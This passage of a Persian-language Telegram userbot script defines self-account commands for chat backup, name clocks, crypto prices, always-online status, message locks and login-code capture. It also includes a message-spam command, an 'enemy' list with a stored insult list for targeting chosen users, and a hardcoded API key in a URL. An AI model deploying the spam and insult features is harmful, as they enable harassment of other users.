        "پاسخ", "دشمن", "فحش", "حذف", "لیست دشمن", "دشمنان", "پاک کردن دشمنان", 
        "همه", "مدیا", "استیکر", "فوروارد", "وویس", "پیام", "فایل", "وضعیت قفل", 
        "ریست قفل", "راهنمای قفل", 
        "انتی لاگین", "ریکت", "حذف ریکت", "لیست ریکت", "پاکسازی ریکت",
        "ویرایش",
        "تنظیم بنر", "بنر همگانی", "لیست بنرها", "حذف بنر", "بنر همگانی خاموش", "بنر ارسال", "زمان بنر",
        "فرمت",
        "پینگ", "تعداد کانال ها", "تعداد گروه ها", "خروج همه کانال", "خروج همه گروه",
        "اکشن",
        "اینستا" 
    ], prefixes=""))
    async def auto_html_format_messages(client, message):
        if any(format_settings.values()):
            original_text = message.text
            formatted_text = original_text
            for format_name, is_active in format_settings.items():
                if is_active:
                    formatted_text = html_tags[format_name].format(formatted_text)        
            try:
                await message.edit_text(
                    formatted_text,
                    parse_mode=enums.ParseMode.HTML
                )
            except Exception as e:
                print(f"❌ خطا در فرمت کردن پیام: {e}")
    @app.on_message(filters.me & filters.command("سیو", prefixes=""))
    async def save_command(client: Client, message: Message):
        if len(message.command) < 2: 
            return await message.edit_text("**لطفا یوزرنیم کاربر را وارد کنید**\n\nمثال: `سیو @LuminousPath`")
        
        chat_input = message.command[1].lstrip('@')
        try:
            user = await client.get_users(chat_input)
            chat_id, user_name = user.id, f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{user.id}"
        except: 
            return await message.edit_text(f"**کاربر '{chat_input}' پیدا نشد**")
        
        loading_msg = await message.edit_text(f"🔄 **در حال پشتیبان‌گیری از {user_name}...**")
        success, result, message_count, user_name = await backup_chat(client, chat_id, message.id)
        
        if success:
            await loading_msg.edit_text("**در حال آپلود فایل پشتیبان...**")
            await client.send_document(
                "me", 
                document=result, 
                caption=f"**پشتیبان‌گیری کامل شد**\n\n**کاربر:** {user_name}\n**آیدی:** `{chat_id}`\n**تعداد پیام‌ها:** {message_count}\n**فرمت:** فایل متنی (TXT)\n**تاریخ:** {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            )
            os.remove(result)
            await loading_msg.delete()
        else: 
            await loading_msg.edit_text(f"❌ **خطا در پشتیبان‌گیری:**\n`{result}`")
    
    @app.on_message(filters.me & filters.command("تایم", prefixes="") & filters.regex(r"^تایم (روشن|خاموش)$"))
    async def time_command(client: Client, message: Message):
        global time_updater_started  
        if len(message.command) < 2: 
            return await message.edit("**استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")
        
        action = message.command[1]
        user_id = message.from_user.id
        
        if action == "روشن":
            user_time_status[user_id] = True
            user_original_names.setdefault(user_id, message.from_user.first_name or "")
            success = await update_name_with_time(user_id, client)
            
            if not time_updater_started:  
                time_updater_started = True  
                asyncio.create_task(continuous_time_updater(client))
            
            await message.edit("**تایم کنار نام فعال شد**\n**راس هر دقیقه آپدیت می‌شود**" if success else "**خطا در تغییر نام**")
            
        elif action == "خاموش":
            user_time_status[user_id] = False
            if user_id in user_original_names:
                try:
                    await client.update_profile(first_name=user_original_names[user_id])
                    await message.edit("**تایم کنار نام غیرفعال شد**\nنام شما به حالت اول بازگشت")
                except: 
                    await message.edit("❌ خطا در بازگردانی نام")
            else: 
                await message.edit("✅ تایم کنار نام غیرفعال شد")
        else:
            await message.edit("⚠️ **استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")
    
    @app.on_message(filters.me & filters.command("لیست فونت", prefixes=""))
    async def font_list_command(client: Client, message: Message):
        sample_time = "12:34"
        fonts_samples = "\n".join([f"**فونت {i}:** {''.join([FONTS[i].get(char, char) for char in sample_time])}" for i in range(1, 7)])
        await message.edit(f"🔤 **لیست فونت‌های زمان**\n\n{fonts_samples}\n\n**استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")
    
    @app.on_message(filters.me & filters.command("تنظیم فونت", prefixes=""))
    async def set_font_command(client: Client, message: Message):
        if len(message.command) < 2: 
            return await message.edit("⚠️ **استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")
        
        try:
            font_num = int(message.command[1])
            if 1 <= font_num <= 6:
                user_fonts["me"] = font_num
                if user_time_status.get(message.from_user.id, False): 
                    await update_name_with_time(message.from_user.id, client)
                await message.edit(f"✅ **فونت زمان به شماره {font_num} تغییر کرد**\n\nنمونه: {get_iran_time()}")
            else: 
                await message.edit("❌ **شماره فونت باید بین 1 تا 6 باشد**")
        except ValueError: 
            await message.reply("❌ **لطفا یک عدد وارد کنید**\nمثال: `تنظیم فونت 2`")
    
    @app.on_message(filters.me & filters.command("قیمت", prefixes=""))
    async def price_command(client: Client, message: Message):
        try:
            if len(message.command) < 2:
                await message.edit_text("❌ **لطفا نام ارز را وارد کنید**\nمثال: `قیمت ton` یا `قیمت بیت‌کوین`")
                return
            
            coin_input = ' '.join(message.command[1:]).strip()
            loading_msg = await message.edit_text(f"🔍 **در حال دریافت قیمت {coin_input}...**")        
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.fast-creat.ir/nobitex/v2?apikey=8000978149:Vqsu9H08Z6rzAQw@Api_ManagerRoBot") as response:
                    if response.status == 200:
                        data = await response.json()                    
                        if data.get("ok"):
                            prices = data["result"]
                            found_coin = None
                            coin_key = None
                            if coin_input.upper() in prices:
                                found_coin = prices[coin_input.upper()]
                                coin_key = coin_input.upper()
                            else:
                                for key, coin_data in prices.items():
                                    if 'name' in coin_data and coin_input.lower() in coin_data['name'].lower():
                                        found_coin = coin_data
                                        coin_key = key
                                        break                        
                            if found_coin and coin_key:
                                coin_data = found_coin
                                price_text = f"""**💰 قیمت {coin_data['name']} ({coin_key})**
    💵 **قیمت تومانی:** `{'{:,}'.format(int(float(coin_data['irr'])))}` تومان
    💰 **قیمت دلاری:** `{float(coin_data['usdt']):,.2f}$`
    📊 **تغییر 24h:** {'🟢' if float(coin_data['dayChange']) > 0 else '🔴'} `{coin_data['dayChange']}%`
    
    ⏰ **آپدیت:** {datetime.now(pytz.timezone('Asia/Tehran')).strftime('%H:%M')}
    """
                                await loading_msg.edit_text(price_text)
                            else:
                                await loading_msg.edit_text(f"❌ **ارز '{coin_input}' یافت نشد**\n\n💡 **مثال‌ها:**\n`قیمت BTC` - `قیمت بیت‌کوین`\n`قیمت ETH` - `قیمت اتریوم`\n`قیمت TON` - `قیمت تون`")
                        else:
                            await loading_msg.edit_text("❌ خطا در دریافت اطلاعات از API")
                    else:
                        await loading_msg.edit_text("❌ خطا در اتصال به سرور")
                        
        except Exception as e:
            await message.edit_text(f"❌ خطا: {str(e)}")
    
    @app.on_message(filters.me & filters.command("اسپم", prefixes=""))
    async def spam_command(client: Client, message: Message):
        if len(message.command) < 3:
            return await message.edit_text("❌ **فرمت صحیح:**\n`اسپم 10 سلام`\n\nعدد = تعداد پیام\nمتن = پیام مورد نظر")
        
        try:
            count = int(message.command[1])
            if count > 50:
                return await message.edit_text("❌ **حداکثر تعداد مجاز: 50 پیام**")
            
            spam_text = ' '.join(message.command[2:])
            
            if not spam_text:
                return await message.edit_text("❌ **لطفا متن پیام را وارد کنید**")
            
            loading_msg = await message.edit_text(f"🔄 **در حال ارسال {count} پیام...**")
            
            success_count = 0
            for i in range(count):
                try:
                    await client.send_message(
                        message.chat.id,
                        f"{spam_text}",
                        reply_to_message_id=message.reply_to_message_id if message.reply_to_message else None
                    )
                    success_count += 1
                    await asyncio.sleep(0.2)
                except Exception as e:
                    print(f"خطا در ارسال پیام {i+1}: {e}")
            
            await loading_msg.edit_text(f"✅ **اسپم کامل شد**\n\n📤 **تعداد ارسال شده:** {success_count}/{count}\n💬 **متن:** {spam_text[:50]}{'...' if len(spam_text) > 50 else ''}")
            
        except ValueError:
            await message.edit_text("❌ **لطفا تعداد را به صورت عدد وارد کنید**\nمثال: `اسپم 10 سلام`")
        except Exception as e:
            await message.edit_text(f"❌ **خطا در ارسال اسپم:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("پاسخ", prefixes=""))
    async def auto_reply_command(client: Client, message: Message):
        if len(message.command) < 2:
            return await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")
        
        sub_command = message.command[1]
        
        if sub_command == "افزودن":
            if len(message.command) < 3:
                return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
            
            try:
                parts = ' '.join(message.command[2:]).split('|', 1)
                if len(parts) != 2:
                    return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
                
                trigger, reply = parts[0].strip(), parts[1].strip()
                auto_replies[trigger] = reply
                await message.edit(f"✅ **پاسخ خودکار افزوده شد**\n\n**متن:** {trigger}\n**پاسخ:** {reply}")
            except Exception as e:
                await message.edit(f"❌ **خطا در افزودن پاسخ:**\n`{e}`")
        
        elif sub_command == "حذف":
            if len(message.command) < 3:
                return await message.edit("❌ **لطفا متن پاسخ را وارد کنید**\nمثال: `پاسخ حذف سلام`")
            
            trigger = ' '.join(message.command[2:]).strip()
            if trigger in auto_replies:
                del auto_replies[trigger]
                await message.edit(f"✅ **پاسخ خودکار حذف شد**\n\n**متن:** {trigger}")
            else:
                await message.edit(f"❌ **پاسخ برای متن '{trigger}' یافت نشد**")
        
        elif sub_command == "لیست":
            if not auto_replies:
                await message.edit("❌ **هیچ پاسخی تنظیم نشده**")
            else:
                replies_list = "\n".join([f"• **{trigger}** → {reply}" for trigger, reply in auto_replies.items()])
                await message.edit(f"📝 **لیست پاسخ‌های خودکار**\n\n{replies_list}\n\n**تعداد:** {len(auto_replies)}")
        
        else:
            await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")
    
    @app.on_message(filters.me & filters.command("دشمن", prefixes=""))
    async def enemy_command(client: Client, message: Message):
        if not message.reply_to_message:
            return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کن**")
        
        enemy_user = message.reply_to_message.from_user
        enemy_id = enemy_user.id
        
        if is_enemy(enemy_id):
            await message.edit(f"❌ **این کاربر از قبل دشمن است**\n\n👤 کاربر: {enemy_user.first_name}\n🆔 آیدی: `{enemy_id}`")
        else:
            enemies.add(enemy_id)
            save_enemies(enemies)
            await message.edit(f"**کاربر مورد نظر به لیست دشمن ها اضافه شد 😈**")
    
    @app.on_message(filters.me & filters.command("فحش", prefixes=""))
    async def insult_command(client: Client, message: Message):
        if len(message.command) < 2:
            return await message.edit("""
    ⚠️ **سیستم مدیریت فحش‌ها**
    
    📋 **دستورات موجود:**
    • `فحش افزودن [متن]` - افزودن فحش جدید
    • `فحش حذف [متن]` - حذف فحش
    • `لیست فحش` - مشاهده لیست فحش‌ها
    
    📝 **مثال:**
    `فحش افزودن تو احمقی`
    `فحش حذف تو احمقی`
    `لیست فحش`
    """)
        
        sub_command = message.command[1]
        
        if sub_command == "افزودن":
            if len(message.command) < 3:
                return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش افزودن تو احمقی`")
            
            insult_text = ' '.join(message.command[2:]).strip()
            insults_list = load_insults()
            if insult_text not in insults_list:
                insults_list.append(insult_text)
                if save_insults(insults_list):
                    await message.edit(f"✅ **فحش افزوده شد**\n\n💢 متن: {insult_text}")
                else:
                    await message.edit("❌ **خطا در ذخیره فحش**")
            else:
                await message.edit(f"❌ **این فحش از قبل وجود دارد**")
        
        elif sub_command == "حذف":
            if len(message.command) < 3:
                return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش حذف تو احمقی`")
            
            insult_text = ' '.join(message.command[2:]).strip()
            insults_list = load_insults()
            if insult_text in insults_list:
                insults_list.remove(insult_text)
                if save_insults(insults_list):
                    await message.edit(f"✅ **فحش حذف شد**\n\n💢 متن: {insult_text}")
                else:
                    await message.edit("❌ **خطا در حذف فحش**")
            else:
                await message.edit(f"❌ **این فحش یافت نشد**")
        
        else:
            await message.edit("⚠️ **استفاده:**\n`فحش افزودن [متن]`\n`فحش حذف [متن]`\n`لیست فحش`")
    
    @app.on_message(filters.me & filters.command("حذف", prefixes=""))
    async def remove_enemy_command(client: Client, message: Message):
        text = message.text.strip()
        if text == "حذف دشمن":
            if not message.reply_to_message:
                return await message.edit("❌ باید روی پیام دشمن ریپلای کنی")
    
            user_id = message.reply_to_message.from_user.id
    
            if user_id in enemies:
                enemies.remove(user_id)
                save_enemies(enemies)
                return await message.edit("✅ کاربر با موفقیت از لیست دشمن حذف شد")
            else:
                return await message.edit("⚠️ این کاربر داخل لیست دشمن نیست")
    
    @app.on_message(filters.me & filters.command("لیست دشمن", prefixes=""))
    async def enemy_list_command(client: Client, message: Message):
        if not enemies:
            return await message.edit("❌ **لیست دشمنان خالی است**")
        
        try:
            loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات دشمنان...**")
            
            enemies_list = []
            
            for enemy_id in list(enemies):
                try:
                    user = await client.get_users(enemy_id)
                    first_name = user.first_name or ""
                    last_name = user.last_name or ""
                    username = f"@{user.username}" if user.username else "❌ ندارد"
                    full_name = f"{first_name} {last_name}".strip()
                    
                    enemies_list.append({
                        'id': enemy_id,
                        'name': full_name,
                        'username': username
                    })
                    await asyncio.sleep(0.1)
                    
                except Exception as e:
                    print(f"❌ خطا در دریافت اطلاعات کاربر {enemy_id}: {e}")
                    enemies_list.append({
                        'id': enemy_id,
                        'name': "❌ خطا در دریافت",
                        'username': "❌ خطا در دریافت"
                    })
            
            if not enemies_list:
                return await loading_msg.edit("❌ **هیچ دشمنی در لیست وجود ندارد**")
            
            list_text = f"👿 **لیست دشمنان - تعداد: {len(enemies_list)}**\n\n"
            
            for i, enemy in enumerate(enemies_list, 1):
                list_text += f"{i}. **نام:** {enemy['name']}\n"
                list_text += f"   **آیدی:** `{enemy['id']}`\n"
                list_text += f"   **یوزرنیم:** {enemy['username']}\n"
                list_text += "   " + "─" * 30 + "\n"
            
            if len(list_text) > 4000:
                parts = [list_text[i:i+4000] for i in range(0, len(list_text), 4000)]
                for part in parts:
                    await client.send_message(message.chat.id, part)
                await loading_msg.delete()
            else:
                await loading_msg.edit(list_text)
                
        except Exception as e:
            await message.edit(f"❌ **خطا در دریافت لیست دشمنان:**\n`{e}`")
    
    @app.on_message(filters.me & filters.command("دشمنان", prefixes=""))
    async def enemies_compact_command(client: Client, message: Message):
        if not enemies:
            return await message.edit("❌ **لیست دشمنان خالی است**")
        
        try:
            loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات...**")
            
            compact_text = f"👿 **لیست دشمنان - تعداد: {len(enemies)}**\n\n"
            
            for i, enemy_id in enumerate(list(enemies), 1):
                try:
                    user = await client.get_users(enemy_id)
                    first_name = user.first_name or ""
                    last_name = user.last_name or ""
                    username = f"@{user.username}" if user.username else "بدون یوزرنیم"
                    full_name = f"{first_name} {last_name}".strip() or "بدون نام"
                    
                    compact_text += f"{i}. **{full_name}** - {username} - `{enemy_id}`\n"
                    
                except Exception as e:
                    compact_text += f"{i}. ❌ خطا در دریافت - `{enemy_id}`\n"
            
            await loading_msg.edit(compact_text)
            
        except Exception as e:
            await message.edit(f"❌ **خطا:**\n`{e}`")
    
    @app.on_message(filters.me & filters.command("پاک کردن دشمنان", prefixes=""))
    async def clear_enemies_command(client: Client, message: Message):
        if not enemies:
            return await message.edit("❌ **لیست دشمنان از قبل خالی است**")
        
        enemy_count = len(enemies)
        enemies.clear()
        save_enemies(enemies)
        
        await message.edit(f"✅ **تمام دشمنان پاک شدند**\n\n🗑 **تعداد حذف شده:** {enemy_count} نفر")
    @app.on_message(filters.me & filters.command("ایدی", prefixes="") & filters.regex(r"^ایدی$"))
    async def advanced_id_command(client: Client, message: Message):
        try:
            user = message.from_user
            chat = message.chat
            
            premium_status = "<b>فعال</b>" if user.is_premium else "<i>غیرفعال</i>"
            username_id = f"@{user.username}" if user.username else "<i>ندارد</i>"
            profile_photos = await client.get_chat_photos_count(user.id)
            
            if message.reply_to_message:
                replied_user = message.reply_to_message.from_user
                replied_chat = message.chat
                
                common_chats = await client.get_common_chats(replied_user.id)
                
                user_info = f"""
    <b>• اطلاعات کاربر</b>
    
    <b>آیدی عددی:</b> <code>{replied_user.id}</code>
    <b>یوزرنیم:</b> <code>{username_id}</code>
    <b>نام:</b> {replied_user.first_name or '<i>ندارد</i>'}
    <b>نام خانوادگی:</b> {replied_user.last_name or '<i>ندارد</i>'}
    <b>پریمیوم:</b> {"<b>فعال</b>" if replied_user.is_premium else "<i>غیرفعال</i>"}
    <b>تعداد پروفایل:</b> {await client.get_chat_photos_count(replied_user.id)}
    
    <b>• اطلاعات چت</b>
    <b>آیدی چت:</b> <code>{replied_chat.id}</code>
    <b>عنوان چت:</b> {replied_chat.title or '<i>ندارد</i>'}
    <b>تعداد اعضا:</b> {replied_chat.members_count if hasattr(replied_chat, 'members_count') and replied_chat.members_count else '<i>نامشخص</i>'}
    """
                
                if common_chats:
                    user_info += f"\n<b>• گروه‌های مشترک:</b> {len(common_chats)}\n"
                    user_info += f"<blockquote>"
                    
                    for i, common_chat in enumerate(common_chats, 1):
                        chat_type = "گروه" if common_chat.type in ["group", "supergroup"] else "کانال" if common_chat.type == "channel" else "شخصی"
                        username = f"@{common_chat.username}" if common_chat.username else "بدون یوزرنیم"
                        members = f"{common_chat.members_count} عضو" if hasattr(common_chat, 'members_count') and common_chat.members_count else "نامشخص"
                        
                        user_info += f"<b>{i}. {common_chat.title}</b>\n"
                        user_info += f"<i>نوع:</i> {chat_type}\n"
                        user_info += f"<i>یوزرنیم:</i> {username}\n"
                        user_info += f"<i>اعضا:</i> {members}\n"
                        user_info += f"<i>آیدی:</i> <code>{common_chat.id}</code>"
                        
                        if i < len(common_chats):
                            user_info += f"\n\n"
                    
                    user_info += f"</blockquote>"
                else:
                    user_info += f"\n<b>• گروه‌های مشترک:</b> <i>هیچ گروه مشترکی یافت نشد</i>"
                
                await message.edit_text(user_info, parse_mode=enums.ParseMode.HTML)
                
            else:
                chat_info = f"""
    <b>• اطلاعات کاربر و چت</b>
    
    <b>اطلاعات شما</b>
    <b>آیدی عددی:</b> <code>{user.id}</code>
    <b>یوزرنیم:</b> <code>{username_id}</code>
    <b>نام:</b> {user.first_name or '<i>ندارد</i>'}
    <b>نام خانوادگی:</b> {user.last_name or '<i>ندارد</i>'}
    <b>پریمیوم:</b> {premium_status}
    <b>تعداد پروفایل:</b> {profile_photos}
    
    <b>اطلاعات چت فعلی</b>
    <b>آیدی چت:</b> <code>{chat.id}</code>
    <b>عنوان چت:</b> {chat.title or '<i>ندارد</i>'}
    <b>تعداد اعضا:</b> {chat.members_count if hasattr(chat, 'members_count') and chat.members_count else '<i>نامشخص</i>'}
    """
                await message.edit_text(chat_info, parse_mode=enums.ParseMode.HTML)
                
        except Exception as e:
            await message.edit_text(f"<b>خطا در دریافت اطلاعات:</b>\n<code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)
    
    @app.on_message(filters.me & filters.command("دانلود", prefixes=""))
    async def download_from_link(client: Client, message: Message):
        if len(message.command) < 2:
            await message.edit_text("❌ **فرمت:**\n`دانلود https://t.me/channel/123`")
            return    
        link = message.command[1]    
        try:
            pattern = r"https://t\.me/(.+)/(\d+)"
            match = re.match(pattern, link)        
            if not match:
                await message.edit_text("❌ **لینک نامعتبر!**\nفرمت صحیح: `https://t.me/channel/123`")
                return        
            username = match.group(1)
            post_id = int(match.group(2))        
            processing_msg = await message.edit_text("🔍 **در حال دریافت پست...**")
            post = await client.get_messages(username, post_id)        
            if not post:
                await processing_msg.edit_text("❌ **پست یافت نشد**")
                return        
            await processing_msg.edit_text("📥 **در حال کپی کردن پست...**")        
            try:
                await post.copy("me")
                await processing_msg.edit_text("✅ **پست با موفقیت در پیام‌های ذخیره شده کپی شد**")            
            except Exception as copy_error:
                await processing_msg.edit_text("🔄 **روش دوم: در حال ارسال محتوا...**")            
                try:
                    if post.media:
                        file_path = await post.download()
                        if post.audio:
                            await client.send_audio("me", file_path, caption=post.caption or "")
                        elif post.video:
                            await client.send_video("me", file_path, caption=post.caption or "")
                        elif post.photo:
                            await client.send_photo("me", file_path, caption=post.caption or "")
                        elif post.document:
                            await client.send_document("me", file_path, caption=post.caption or "")
                        elif post.voice:
                            await client.send_voice("me", file_path, caption=post.caption or "")
                        elif post.sticker:
                            await client.send_sticker("me", file_path)
                        elif post.animation:
                            await client.send_animation("me", file_path, caption=post.caption or "")
                        elif post.video_note:
                            await client.send_video_note("me", file_path)
                        else:
                            await client.send_document("me", file_path, caption=post.caption or "")                    
                        os.remove(file_path)
                    if post.text:
                        await client.send_message("me", post.text)                
                    await processing_msg.edit_text("✅ **محتوا با موفقیت ارسال شد**")                
                except Exception as download_error:
                    await processing_msg.edit_text(f"❌ **خطا:** `{str(download_error)}`")            
        except Exception as e:
            await message.edit_text(f"❌ **خطا:** `{str(e)}`")
    @app.on_message(filters.me & filters.regex(r'^آنلاین (روشن|خاموش)$'))
    async def online_command(client, message):
        global always_online_enabled
        
        action = message.matches[0].group(1)
        
        if action == "روشن":
            always_online_enabled = True
            await message.edit_text(
                "✅ **حالت همیشه آنلاین فعال شد**\n\n"
                "🌐 اکانت شما همیشه به عنوان آنلاین نمایش داده خواهد شد."
            )
            asyncio.create_task(keep_online(client))
            
        elif action == "خاموش":
            always_online_enabled = False
            await message.edit_text(
                "❌ **حالت همیشه آنلاین غیرفعال شد**"
            )
    
    @app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه روشن$"))
    async def lock_all_on_command(client, message):
        lock_settings["همه"] = True
        await message.edit("✅ **قفل همه فعال شد**\n\nتمامی پیام‌ها در پیوی حذف خواهند شد.")
    
    @app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه خاموش$"))
    async def lock_all_off_command(client, message):
        lock_settings["همه"] = False
        await message.edit("✅ **قفل همه غیرفعال شد**")
    
    @app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا روشن$"))
    async def lock_media_on_command(client, message):
        lock_settings["مدیا"] = True
        await message.edit("✅ **قفل مدیا فعال شد**\n\nارسال عکس و ویدیو در پیوی حذف خواهد شد.")
    
    @app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا خاموش$"))
    async def lock_media_off_command(client, message):
        lock_settings["مدیا"] = False
        await message.edit("✅ **قفل مدیا غیرفعال شد**")
    
    @app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر روشن$"))
    async def lock_sticker_on_command(client, message):
        lock_settings["استیکر"] = True
        await message.edit("✅ **قفل استیکر فعال شد**\n\nارسال استیکر و گیف در پیوی حذف خواهد شد.")
    
    @app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر خاموش$"))
    async def lock_sticker_off_command(client, message):
        lock_settings["استیکر"] = False
        await message.edit("✅ **قفل استیکر غیرفعال شد**")
    
    @app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد روشن$"))
    async def lock_forward_on_command(client, message):
        lock_settings["فوروارد"] = True
        await message.edit("✅ **قفل فوروارد فعال شد**\n\nارسال پیام فورواردی در پیوی حذف خواهد شد.")
    
    @app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد خاموش$"))
    async def lock_forward_off_command(client, message):
        lock_settings["فوروارد"] = False
        await message.edit("✅ **قفل فوروارد غیرفعال شد**")
    
    @app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس روشن$"))
    async def lock_voice_on_command(client, message):
        lock_settings["ویس"] = True
        await message.edit("✅ **قفل ویس فعال شد**\n\nارسال ویس در پیوی حذف خواهد شد.")
    
    @app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس خاموش$"))
    async def lock_voice_off_command(client, message):
        lock_settings["ویس"] = False
        await message.edit("✅ **قفل ویس غیرفعال شد**")
    
    @app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام روشن$"))
    async def lock_text_on_command(client, message):
        lock_settings["پیام"] = True
        await message.edit("✅ **قفل پیام فعال شد**\n\nارسال پیام متنی در پیوی حذف خواهد شد.")
    
    @app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام خاموش$"))
    async def lock_text_off_command(client, message):
        lock_settings["پیام"] = False
        await message.edit("✅ **قفل پیام غیرفعال شد**")
    
    @app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل روشن$"))
    async def lock_file_on_command(client, message):
        lock_settings["فایل"] = True
        await message.edit("✅ **قفل فایل فعال شد**\n\nارسال فایل در پیوی حذف خواهد شد.")
    
    @app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل خاموش$"))
    async def lock_file_off_command(client, message):
        lock_settings["فایل"] = False
        await message.edit("✅ **قفل فایل غیرفعال شد**")
    
    @app.on_message(filters.me & filters.command("وضعیت قفل", prefixes="") & filters.regex(r"^وضعیت قفل$"))
    async def lock_status_command(client, message):
        status_text = "🔒 **وضعیت قفل‌های پیوی**\n\n"
        
        for lock_type, status in lock_settings.items():
            emoji = "🔴" if status else "🟢"
            persian_status = "قفل" if status else "آزاد"
            status_text += f"{emoji} **{lock_type}**: {persian_status}\n"
        
        status_text += f"\n📊 **تعداد قفل‌های فعال:** {sum(lock_settings.values())} از {len(lock_settings)}"
        
        await message.edit(status_text)
    
    @app.on_message(filters.me & filters.command("ریست قفل", prefixes="") & filters.regex(r"^ریست قفل$"))
    async def reset_lock_command(client, message):
        for key in lock_settings:
            lock_settings[key] = False
        
        await message.edit("✅ **همه قفل‌ها ریست شدند**\n\nهمه دسترسی‌ها آزاد شدند.")
    
    @app.on_message(filters.me & filters.command("راهنمای قفل", prefixes="") & filters.regex(r"^راهنمای قفل$"))
    async def lock_help_command(client, message):
        help_text = """
    🛡️✨ **مرکز کنترل قفل‌های پیوی**
    
    ╭───────◆◇◆───────╮
          🔒 کنترل حرفه‌ای حریم خصوصی
    ╰───────◆◇◆───────╯
    
    📘 **شرح کوتاه:**  
    با این دستورات می‌تونی تمام پیام‌ها، مدیاها و تعاملات داخل پیوی رو مدیریت و محدود کنی.
    
    ━━━━━━━━━━━━━━━━━━
    
    🌐 **بخش ۱ — قفل‌های کلی**
    • `همه روشن` ➜ فعال‌سازی کامل قفل‌ها  
    • `همه خاموش` ➜ آزادسازی کامل  
    
    ━━━━━━━━━━━━━━━━━━
    
    🎨 **بخش ۲ — مدیا و استیکر**
    • `مدیا روشن` ➜ بستن عکس، ویدیو و مدیا  
    • `مدیا خاموش` ➜ آزادسازی مدیا  
    • `استیکر روشن` ➜ قفل استیکر و گیف  
    • `استیکر خاموش` ➜ آزادسازی استیکر  
    
    ━━━━━━━━━━━━━━━━━━
    
    🔁 **بخش ۳ — فوروارد و متن**
    • `فوروارد روشن` ➜ جلوگیری از فوروارد  
    • `فوروارد خاموش` ➜ آزادسازی فوروارد  
    • `پیام روشن` ➜ قفل پیام‌های متنی  
    • `پیام خاموش` ➜ مجاز کردن متن‌ها  
    
    ━━━━━━━━━━━━━━━━━━
    
    🎧 **بخش ۴ — صدا و فایل**
    • `ویس روشن` ➜ قفل ویس  
    • `ویس خاموش` ➜ آزادسازی ویس  
    • `فایل روشن` ➜ قفل فایل‌ها  
    • `فایل خاموش` ➜ آزادسازی فایل  
    
    ━━━━━━━━━━━━━━━━━━
    
    📊 **بخش ۵ — مدیریت وضعیت**
    • `وضعیت قفل` ➜ نمایش وضعیت فعلی  
    • `ریست قفل` ➜ بازگردانی به حالت اولیه  
    
    ━━━━━━━━━━━━━━━━━━
    
    💡 **نمونه استفاده:**  
    `همه روشن`  
    """
        await message.edit(help_text)
    
    @app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین روشن$"))
    async def enable_anti_login(client, message):
        global anti_login_enabled
        anti_login_enabled = True
        await message.edit("""✅ **انتی لاگین فعال شد**
    
    🛡️ **قابلیت‌ها:**
    • شناسایی پیام‌های کد ورود از 777000
    • استخراج خودکار کدهای ورود  
    • ذخیره کدها در پیام‌های ذخیره شده
    • حذف پیام اصلی برای امنیت
    
    📱 **کدها در Saved Messages ذخیره می‌شوند**""")
    
    @app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین خاموش$"))
    async def disable_anti_login(client, message):
        global anti_login_enabled
        anti_login_enabled = False
        await message.edit("✅ **انتی لاگین غیرفعال شد**")
    
    @app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین$"))
    async def check_anti_login(client, message):
        status = "فعال ✅" if anti_login_enabled else "غیرفعال ❌"
        
        status_text = f"""🛡️ **وضعیت انتی لاگین:** {status}
    
    {"📱 **سیستم فعال است** - کدهای ورود ذخیره می‌شوند" if anti_login_enabled else "🔓 **سیستم غیرفعال است** - پیام‌ها دست‌نخورده باقی می‌مانند"}"""
    
        await message.edit(status_text)
    
    @app.on_message(filters.me & filters.regex(r'^ریکت\s+(.+)$'))
    async def set_reaction_command(client, message):
        if len(message.command) < 2:
            await message.edit("""✨ **سیستم ریکشن خودکار**
    
    📌 **استفاده:**
    • `ریکت 😊` (ریپلای روی پیام کاربر)
    • `ریکت 😊 @username`
    
    📌 **دستورات دیگر:**
    • `حذف ریکت` (ریپلای یا یوزرنیم)
    • `لیست ریکت`
    • `پاکسازی ریکت`""")
            return
        
        reaction_emoji = message.command[1]
        
        if message.reply_to_message and message.reply_to_message.from_user:
            user_id = message.reply_to_message.from_user.id
